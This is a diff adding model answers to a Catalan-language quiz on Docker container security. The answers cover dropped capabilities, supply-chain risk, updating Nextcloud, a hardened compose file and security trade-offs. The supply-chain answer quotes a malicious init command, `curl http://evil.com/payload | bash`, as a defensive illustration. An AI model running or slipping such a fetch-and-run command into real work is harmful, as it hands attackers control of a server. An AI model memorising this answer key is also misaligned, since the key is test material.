@@ -179,6 +179,182 @@ Aixo es la base. En entorns mes critics afegiries SELinux/AppArmor, signatura d'
 
 ---
 
+## Pregunta 11 (oberta): Per que Docker ja treu capabilities
+
+**Resposta model**:
+
+Docker, per defecte, ja treu un munt de capabilities de Linux als contenidors. Això es una decisio de disseny critica: en lloc de donar totes les capabilities per defecte i esperar que l'usuari en tregui, Docker nomes dona les estrictament necessaries.
+
+Les capabilities mes perilloses que Docker ja treu per defecte son:
+
+- **CAP_SYS_ADMIN**: una mena de "superusuari" que permet muntar sistemes de fitxers, accedir a /proc d'altres processos, etc. Es la mes perillosa: amb aquesta, un atacant pot escapar del contenidor.
+- **CAP_NET_RAW**: permet crear paquets de xarxa raw (com els que fa ping o tcpdump). Un atacant pot fer ARP spoofing o sniffar trafic.
+- **CAP_SYS_PTRACE**: permet fer debug d'altres processos. Un atacant pot injectar codi a processos del mateix contenidor o, amb un kernel vulnerable, de l'amfitrio.
+- **CAP_DAC_OVERRIDE**: permet saltar-se els permisos dels fitxers. Combinat amb un bind mount, pot accedir a qualsevol fitxer de l'amfitrio.
+- **CAP_NET_ADMIN**: permet reconfigurar la xarxa. Pot canviar rutes, obrir ports, fer atacs MITM.
+
+**Important**: "root dins el contenidor" NO es equivalent a "root de l'amfitrio". Gracies al drop de capabilities, encara que un atacant aconsegueixi root dins el contenidor, esta molt limitat. Es com tenir una clau mestra dins una habitacio tancada amb pany: tens acces a tot el que hi ha dins, pero no pots sortir.
+
+**Bona practica**: nomes tornar a afegir les capabilities que REALMENT necessites. Per exemple, si una app necesita fer ping, afegeixes `cap_add: [NET_RAW]`. Pero mira si es pot fer d'una altra manera (usar `nslookup` en lloc de `ping`).
+
+---
+
+## Pregunta 12 (oberta): Seguretat i supply chain al BernatLab
+
+**Resposta model**:
+
+La cadena de subministrament (supply chain) esdevé un risc al BernatLab quan descarregues imatges random de Docker Hub. Considerem el cas:
+
+**Risc d'una imatge random**:
+1. Un desconegut puja una imatge `cool-app:latest` a Docker Hub.
+2. La imatge conté un script d'inicialitzacio que executa `curl http://evil.com/payload | bash`.
+3. Tu la fas servir al teu Nextcloud per alguna funcionalitat addicional.
+4. L'atacant ja te acces al teu servidor.
+
+**Cas real**: el 2020, varios miners de cryptomonedes es van colar a imatges populars de Docker Hub. Els usuaris que feien `docker pull` rebien versions backdoorjades sense saber-ho.
+
+**Aplica al cas concret del BernatLab**:
+- Si descarregues una imatge "oficial" (Docker Official Image, marcada amb el badge blau), el risc es molt baix. Docker audita aquestes imatges.
+- Si descarregues una imatge de la comunitat amb poques descarreigues, el risc es alt. L'autor pot ser maliciosos o incompetent.
+- Si construeixes la teva propia imatge desde zero amb un Dockerfile que entens, el risc es minim. Pero la imatge base (debian, alpine) tambe pot tenir vulnerabilitats.
+
+**Politica practica al BernatLab**:
+1. Usar nomes imatges "oficials" o de proveidors reconeguts (Bitnami, LinuxServer.io, etc).
+2. Construir les teves imatges a partir de les oficials, afegint nomes el que necessites.
+3. Escanejar periòdicament amb Trivy o Docker Scout.
+4. Fixar la versio: mai `latest` automatic en produccio.
+5. Mantenir un registre privat per a les imatges que construeixes.
+
+**Aixo es com la seguretat alimentaria**: no compres carn a qualsevol, sinó a una botiga de confiança. I encara aixi, la cuines tu per asegurar-te.
+
+---
+
+## Pregunta 13 (oberta): Actualitzar o no actualitzar
+
+**Resposta model**:
+
+El company que diu "el Nextcloud porta 2 anys sense actualitzar i funciona perfectament" esta posant en risc tot el sistema. Arguments:
+
+**1. La finestra de vulnerabilitat es gran**:
+Cada setmana es publiquen nous CVEs a Nextcloud, PHP, llibreries. Un Nextcloud de 2 anys te centenars de vulnerabilitats acumulades. Nomes cal que UNA d'elles sigui explotable per comprometre el sistema.
+
+**2. Els exploits son cada vegada mes automatitzats**:
+Hi ha scanners automatic (Shodan, Censys) que busquen versions especifiques de Nextcloud amb CVEs coneguts. Quan es publica un exploit public (cosa que pasa setmanalment), els atacants l'escanejen en hores. Un Nextcloud de 2 anys sense pegat es un objectiu facil.
+
+**3. Un cop compromes, tot es perd**:
+Si un atacant entra, pot:
+- Llegir tots els fitxers dels usuaris.
+- Esborrar fitxers.
+- Instal·lar ransomware (xifrar i demanar rescat).
+- Usar el servidor com a punt de partida per atacar altres.
+- Fer el servidor part d'una botnet.
+
+**4. Watchtower automatitza el proces**:
+El M2 cap 7 introdueix Watchtower, que pot actualitzar automaticament les imatges. Es la solucio al "no tinc temps d'actualitzar". Configurat correctament (amb notificacions i finestres de manteniment), pots tenir un sistema sempre actualitzat sense dedicacio setmanal.
+
+**5. El cost de no actualitzar es asimètric**:
+- Actualitzar: 30 min/mes (Watchtower ho fa automatic).
+- No actualitzar i tenir un incident: dies de feina, possible perdua de dades, posibles responsabilitats legals (si hi ha dades de tercers).
+
+**Conclusio al company**: "funciona perfectament" es sinònim de "ningú ha intentat trencar-lo encara". No es qüestio de si passarà, sino quan.
+
+---
+
+## Pregunta 14 (oberta): Nextcloud segur al BernatLab
+
+**Resposta model**:
+
+Per a un Nextcloud exposat a internet al BernatLab, el tros de `docker-compose.yml` amb mesures de seguretat seria:
+
+```yaml
+services:
+  nextcloud:
+    image: nextcloud:28-apache  # tag fixe, mai latest
+    # 1. Usuari no-root
+    user: "33:33"  # www-data dins el contenidor
+    # 2. Read-only filesystem amb tmpfs per a directoris d'escriptura
+    read_only: true
+    tmpfs:
+      - /tmp:size=100M
+      - /var/www/html/tmp:size=500M
+    # 3. Drop totes les capabilities
+    cap_drop:
+      - ALL
+    cap_add:
+      - CHOWN  # nomes el que Nextcloud necessita
+      - SETUID
+      - SETGID
+    # 4. No nous privilegis
+    security_opt:
+      - no-new-privileges:true
+    # 5. Xarxa aillada
+    networks:
+      - frontend  # nomes per rebre trafic HTTPS
+    # 6. Limits de recursos
+    mem_limit: 1g
+    cpus: 1.0
+    # 7. Restart automatic nomes en cas de error (no always)
+    restart: on-failure:5
+    volumes:
+      - nc-data:/var/www/html
+      - nc-config:/var/www/html/config
+    # 8. Sense port directe (passa pel reverse proxy)
+    # expose:
+    #   - 80
+
+networks:
+  frontend:
+    external: true  # gestionada per Caddy
+```
+
+**Justificacio de cada mesura**:
+
+- **user: "33:33"**: si un atacant aconsegueix executar codi, no sera root.
+- **read_only + tmpfs**: el filesystem es immutable. Un atacant no pot persistir modificant fitxers de l'aplicacio.
+- **cap_drop: ALL**: nomes les capabilities essencials (CHOWN, SETUID, SETGID) son presents.
+- **no-new-privileges**: evita que un binari SUID dins el contenidor es pugui fer root.
+- **networks external**: la xarxa la gestiona Caddy (el reverse proxy), no Docker directament.
+- **mem_limit**: limita l'impacte d'un atac DoS per memoria.
+- **restart: on-failure**: nomes reinicia si hi ha un error real, no per buit legal.
+
+Aixo es un exemple d'un Nextcloud "hardened". No es la maxima seguretat posible, pero es un bon equilibri per a un homelab.
+
+---
+
+## Pregunta 15 (oberta): Seguretat vs funcionalitat
+
+**Resposta model**:
+
+Aplicar mesures de seguretat molt agressives te un cost: pots acabar amb un contenidor que no arranca o que no fa el que ha de fer. Cal trobar l'equilibri.
+
+**Exemples de mesures que poden trencar funcionalitat**:
+
+- `read_only: true` sense tmpfs: qualsevol operacio que necessiti escriure a /tmp falla.
+- `cap_drop: ALL` sense afegir les necessaries: ni tan sols el startup basic pot funcionar.
+- `mem_limit: 100m` massa baix: el contenidor es queda penjat en OOM.
+- `user: nobody`: alguns procesos necessiten un usuari especific (www-data, postgres, etc).
+- `--network none` en un servei que necessita parlar amb altres: arranca pero no funciona.
+
+**Equilibri al BernatLab**:
+
+**Serveis exposats a internet** (Nextcloud, Immich, una API publica):
+- Seguretat maxima raonable: read-only, cap_drop ALL + necessaries, no-new-privileges, mem_limit, xarxa aillada amb proxy invers.
+- Validacio: fer proves de fum (pujar un fitxer a Nextcloud, pujar una foto a Immich) despres d'aplicar les mesures.
+
+**Serveis en xarxa interna** (PostgreSQL, InfluxDB, ChromaDB):
+- Seguretat mitjana: cap_drop ALL + les essencials, xarxa backend, no exposar ports.
+- Es poden permetre mes permisos perque nomes son accessibles des de dins.
+
+**Eines de desenvolupament** (Adminer, debugging, Jupyter):
+- Seguretat minima: nomes xarxa aillada, sense exposar.
+- Per definicio son eines de dev, no cal que estiguin blindades.
+
+**Regla d'or**: cada mesura de seguretat que aplicis, documenta per que i prova que el servei segueix funcionant. Si no pots provar, no l'apliquis encara. La seguretat sense funcionalitat es nomes un trasto que ocupa memoria.
+
+**Cicle iteratiu**: comença amb el minim viable segur, valida que funciona, afegeix una mesura, valida, afegeix una altra. No intentis aplicar 20 mesures d'una sola vegada.
+
+---
+
 ## Que fer si has fallat moltes preguntes
 
 - **5-8 encerts**: Rellegir el resum i tornar a fer l'exercici.
